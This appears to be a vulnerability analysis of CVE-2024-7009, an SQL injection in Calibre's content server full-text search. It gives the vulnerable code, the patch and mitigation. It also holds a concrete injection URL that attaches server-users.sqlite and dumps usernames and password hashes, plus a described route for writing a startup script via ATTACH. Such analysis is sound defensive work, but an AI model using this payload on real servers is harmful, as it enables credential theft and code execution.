Detailed Summary  
1. CVE Identifier  
   • CVE-2024-7009  
2. Affected Product & Version  
   • Calibre content server, versions ≤ 7.15.0  
3. Vulnerability Type (CWE)  
   • CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)  
4. Impact  
   • A low-privileged user with “full-text search” rights on any library can inject arbitrary SQL into the SQLite engine used by Calibre’s content server.  
   • Attackers can read sensitive data from other databases on the filesystem (for example, the server-users.sqlite database holding usernames and password hashes) and even perform limited file writes via ATTACH/CREATE TABLE statements.  

Root Cause Analysis  
The core issue lies in how user-supplied parameters highlight_start and highlight_end are embedded directly into the SQL snippet() or highlight() function call without any sanitization or parameterization. Specifically, in src/calibre/db/fts/connect.py the code builds the SELECT query like this (simplified):  

Vulnerable code excerpt (fts/connect.py):  
```
# [1] highlight_start and highlight_end come straight from the HTTP query
text = f'''snippet(
    "{fts_table}", 0,
    '{highlight_start}',    <-- no sanitization
    '{highlight_end}',      <-- no sanitization
    '…', {max(1, min(snippet_size,64))})
'''
query  = 'SELECT books_text.id, books_text.book, books_text.format, ' + text
query += ' FROM books_text JOIN ' + fts_table + ' ON ...'
query += f' WHERE "{fts_table}" MATCH ?'
...
conn.execute(query, (fts_engine_query,))
```

Because highlight_start and highlight_end are injected inside single quotes of an f-string, an attacker can break out of the literal, append arbitrary SQL, and comment out the rest of the statement.

Trace of user input flow:  
• The HTTP endpoint `/fts/snippets/{book_ids}` extracts highlight_start/highlight_end directly from rd.query.  
• It passes them into db.fts_search(…, highlight_start=…, highlight_end=…)  
• fts_search builds a dynamic SQL string using f-strings, embedding those values unescaped.  

Patch / Parameterization  
The upstream patch removes inline interpolation of these two parameters and instead uses SQL parameter placeholders (‘?’), binding them safely in the data array. Example diff in src/calibre/db/fts/connect.py:  

Patched code excerpt:  
```
@@ src/calibre/db/fts/connect.py
-    # vulnerable
-    text = f'''snippet("{fts_table}", 0,
-        '{highlight_start}', '{highlight_end}', '…', {snippet_size})'''
-    data = []  # only contains query
+    # safe: use parameter placeholders for highlight_start / highlight_end
+    text = f'''snippet("{fts_table}", 0, ?, ?, '…', {snippet_size})'''
+    data = [highlight_start, highlight_end]
...
+   # later: bind fts_engine_query as well
+   data.append(fts_engine_query)
    for record in conn.execute(query, tuple(data)):
        ...
```

Similar changes were made in `src/calibre/db/backend.py` (search_annotations) and `src/calibre/db/notes/connect.py` to parameterize highlight_start and highlight_end.

Exploit Overview and Steps  
Although the advisory does not include a complete exploit script, the following illustrates how to leverage the injection:

1. The attacker needs only “full-text search” privileges on the Calibre library.  
2. Identify a valid book ID (e.g. 1) and the path to the target database to read—usually `server-users.sqlite` in the Calibre data directory.  
3. Craft an HTTP GET (or POST) to the `/fts/snippets/{book_ids}` endpoint, injecting SQL via highlight_end (or highlight_start).  

Example malicious request URL (Windows path shown):  
```
http://CALIBRE_SERVER/fts/snippets/1
  ?library_id=Calibre_Library
  &query=foo
  &query_id=1
  &highlight_end=','',32) FROM books_text
      JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid
      WHERE "books_fts_stemmed" MATCH ?;
    ATTACH 'C:\Users\Alice\AppData\Roaming\calibre\server-users.sqlite' AS creds;
    SELECT 1,1,username,password FROM creds.users;-- -
```

How this works:  
• The server builds the snippet() call as  
  snippet("books_fts_stemmed", 0, '<default>', '<injected>', '…', 32)  
• By setting highlight_end to  
  `','',32) FROM …; ATTACH …; SELECT …;-- -`  
  the attacker closes the single-quoted literal, injects arbitrary SQL (including ATTACH of another database and SELECT from its tables), and comments out the remainder.  
• The server executes both the original SELECT and the attacker’s malicious statements in the same SQLite connection.  
• The JSON response of `/fts/snippets/…` will include the results of the attacker’s injected SELECT (e.g. username/password rows) in the snippet text or formats array, revealing them to the attacker.  

Limited File Writes  
An attacker can also use `ATTACH 'C:\path\to\newfile.db' AS evil; CREATE TABLE evil.test AS SELECT …;` to write a new SQLite database file or even drop in a malicious script via a .bat or .vbs extension in a writable folder (such as the user’s Startup folder). On next system startup the script would execute.

Mitigation  
• Upgraded Calibre servers should be running > 7.15.0 (with commit d56574285… applied).  
• The patch parameterizes highlight_start and highlight_end, preventing injection.  
• As a defense-in-depth measure, run the content server under a user account with minimal filesystem permissions.